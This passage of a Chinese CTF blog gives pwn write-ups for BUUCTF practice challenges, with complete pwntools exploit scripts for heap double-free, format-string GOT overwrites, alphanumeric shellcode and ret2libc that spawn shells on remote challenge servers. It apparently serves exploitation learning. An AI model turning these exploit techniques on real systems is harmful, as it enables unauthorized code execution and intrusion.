class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Please input the index:\n&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Please input the index:\n&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">quit</span>():<br>    sla(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br><span class="hljs-comment">#----------------------------------------------</span><br>add(<span class="hljs-number">0x410</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;cccc&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>ru(<span class="hljs-string">&#x27;name:\n&#x27;</span>)<br>main_arena=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])-<span class="hljs-number">96</span><br>malloc_hook=main_arena-<span class="hljs-number">0x10</span><br>libc_base=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>free_hook=libc_base+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(main_arena)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(libc_base)<br><span class="hljs-comment">#--------------------------------------------</span><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x20</span>,p64(free_hook),<span class="hljs-string">&#x27;1&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;pppp&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>,p64(system),<span class="hljs-string">&#x27;3&#x27;</span>)<br>free(<span class="hljs-number">3</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="axb-2019-fmt64">axb_2019_fmt64</h3><p>这题写的神志不清了属于是。还有好多疑惑</p><p>参考师傅：[<a href="https://blog.csdn.net/mcmuyanga/article/details/113242453?ops_request_misc=%7B%22request%5Fid%22%3A%22163556754916780366559453%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=163556754916780366559453&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-113242453.pc_search_ecpm_flag&amp;utm_term=axb_2019_fmt64&amp;spm=1018.2226.3001.4187">BUUCTF]PWN——axb_2019_fmt64（64位格式化字符串改got表）_mcmuyanga的博客-CSDN博客</a></p><p><strong>具体步骤：</strong></p><p>1.格式化字符串漏洞泄露libc_base</p><p>2.格式化字符串漏洞改写got表为system</p><p>3.送入/bin/sh</p><p><strong>64位改写got表：</strong></p><p>1.high_sys=(system&gt;&gt;16)&amp;0xff<br>low_sys=system&amp;0xffff</p><p>分别取倒数第三个字节，和最后2个字节</p><p>2.payload=‘%’+str(high_sys-9)+‘c%12$hhn’+‘%’+str(low_sys-high_sys)+‘c%13$hn’<br>print len(payload)<br>payload = payload.ljust(32,“A”) + p64(elf.got[“strlen”] + 2) + p64(elf.got[“strlen”])</p><p>sa(‘Please tell me:’,payload)</p><p>分字节修改strlen的got表为system（hhn是一个字节，hn是两个字节）</p><p><a href="http://3.sa">3.sa</a>(‘Please tell me:’,‘;bin/sh\x00’)</p><p>送/bin/sh\x00</p><p>因为防止格式化字符串被00截断，所以格式化字符串要放在got前面</p><p><strong>疑惑</strong>：orz</p><p>为啥binsh前要加；</p><p>为啥改strlen的got能用，我改printf，sprintf不行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./axb_2019_fmt64&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26407</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><br><span class="hljs-comment">#----------------------------------------------</span><br>offest=<span class="hljs-number">8</span><br>sla(<span class="hljs-string">&#x27;Please tell me:&#x27;</span>,<span class="hljs-string">&#x27;%9$spppp&#x27;</span>+p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br>puts_addr=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])<br>libc = LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>,puts_addr)<br>libc_base=puts_addr-libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(libc_base)<br>system=libc_base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(system)<br><span class="hljs-comment">#---------------------------------------------</span><br>high_sys=(system&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xff</span><br>low_sys=system&amp;<span class="hljs-number">0xffff</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(high_sys)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(low_sys)<br>payload=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(high_sys-<span class="hljs-number">9</span>)+<span class="hljs-string">&#x27;c%12$hhn&#x27;</span>+<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(low_sys-high_sys)+<span class="hljs-string">&#x27;c%13$hn&#x27;</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">len</span>(payload)<br>payload = payload.ljust(<span class="hljs-number">32</span>,<span class="hljs-string">&quot;A&quot;</span>) + p64(elf.got[<span class="hljs-string">&quot;strlen&quot;</span>] + <span class="hljs-number">2</span>) + p64(elf.got[<span class="hljs-string">&quot;strlen&quot;</span>])<br>sa(<span class="hljs-string">&#x27;Please tell me:&#x27;</span>,payload)<br>sa(<span class="hljs-string">&#x27;Please tell me:&#x27;</span>,<span class="hljs-string">&#x27;;bin/sh\x00&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="gyctf-2020-some-thing-exceting">gyctf_2020_some_thing_exceting</h3><p>这题存在uaf漏洞</p><p>程序开始时读入flag存在bss段的变量s处，且它的上面给了我们0x60大小</p><p>我们可以利用doublefree 分配0x60大小的chunk到此处，然后show</p><p><strong>疑虑</strong>：为啥现在中间要隔一个free，我记得以前做其他题直接连续free也行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./gyctf_2020_some_thing_exceting&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26961</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#---------------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ba_length,ba_content,na_length,na_content</span>):<br>        sla(<span class="hljs-string">&#x27;&gt; Now please tell me what you want to do :&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;&gt; ba\&#x27;s length : &#x27;</span>,<span class="hljs-built_in">str</span>(ba_length))<br>        sa(<span class="hljs-string">&#x27;&gt; ba : &#x27;</span>,ba_content)<br>        sla(<span class="hljs-string">&#x27;&gt; na\&#x27;s length : &#x27;</span>,<span class="hljs-built_in">str</span>(na_length))<br>        sa(<span class="hljs-string">&#x27;&gt; na : &#x27;</span>,na_content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>        sla(<span class="hljs-string">&#x27;&gt; Now please tell me what you want to do :&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;&gt; Banana ID : &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>        sla(<span class="hljs-string">&#x27;&gt; Now please tell me what you want to do :&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;&gt; Banana ID : &gt; SCP project ID : &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-comment">#------------------------------------------------------</span><br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>)<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>)<span class="hljs-comment">#1</span><br>addr=<span class="hljs-number">0x602098</span><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>,<span class="hljs-number">0x50</span>,p64(addr))<br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">0x50</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">&#x27; &#x27;</span>)<br>show(<span class="hljs-number">2</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="mrctf2020-shellcode-revenge">mrctf2020_shellcode_revenge</h3><p>参考师傅：[<a href="https://blog.csdn.net/mcmuyanga/article/details/114828207">BUUCTF]PWN——mrctf2020_shellcode_revenge（可见字符shellcode）_mcmuyanga的博客-CSDN博客</a></p><p>这题ida，f5无法反汇编，报错在124D处</p><p>按g ，输入地址jump到那里发现是call rax，而rax与buf有关，看汇编代码发现buf是read函数我们可以输入的数据</p><p>这题也没开nx，我们在buf里填shell，最后就会call shell，</p><p>但上面还有一些判断条件：</p><p>read函数返回值，也就是eax，是读入的buf长度，存入[rbp+var_8]</p><p>即[rbp+var_8]=len（buf）</p><p>1.与0比较，我们要使他长度&gt;0</p><p>[rbp+var_4]=0</p><p>2.再与0比较，要使他长度&lt;0</p><p>这不是矛盾了么</p><p>然后发现程序有另一条路，绕一圈还能执行到这个判断语句</p><p>cdqe使用eax的最高位拓展rax高32位的所有位<br>movzx则是按无符号数传送+扩展（16-32）</p><p>EAX是32位的寄存器，而AX是EAX的低16位,AH是ax的高8位，而AL是ax的低8位<br>大致就是将我们输入的字符串每一位进行比较，</p><p>范围是（0x60，0x7a）（0x2f,0x5a）这些范围的字符是</p><p>string.printable，就是可见字符shellcode。这里使用alpha3帮助我们生成</p><p>这位师傅：<a href="http://taqini.space/2020/03/31/alpha-shellcode-gen/#alphanumeric-shellcode">纯字符shellcode生成指南 | TaQini</a></p><p>直接下载TaQini师傅修改的版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/TaQini/alpha3.git<br></code></pre></td></tr></table></figure><p>直接用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./shellcode_x64.sh rax<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25803</span>)<br>sc=<span class="hljs-string">&#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;</span><br>r.send(sc)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="axb-2019-brop64">axb_2019_brop64</h3><p>直接let2libc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./axb_2019_brop64&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29428</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#----------------------------------------------</span><br>pop_rdi=<span class="hljs-number">0x400963</span><br>repeater=<span class="hljs-number">0x400845</span><br>ru(<span class="hljs-string">&#x27;Please tell me:&#x27;</span>)<br>se(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xd0</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(pop_rdi)+p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(elf.sym[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(repeater))<br>puts_addr=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(puts_addr)<br>libc_base=puts_addr-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(libc_base)<br>og=libc_base+<span class="hljs-number">0x45216</span><br>ru(<span class="hljs-string">&#x27;Please tell me:&#x27;</span>)<br>se(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xd0</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(og))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="inndy-echo">inndy_echo</h3><p>32位格式化字符串改写strcmp_got为system，再填入binsh</p><p>32位直接用payload=fmtstr_payload(offset,{strcmp_got:system})</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./echo&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28185</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, 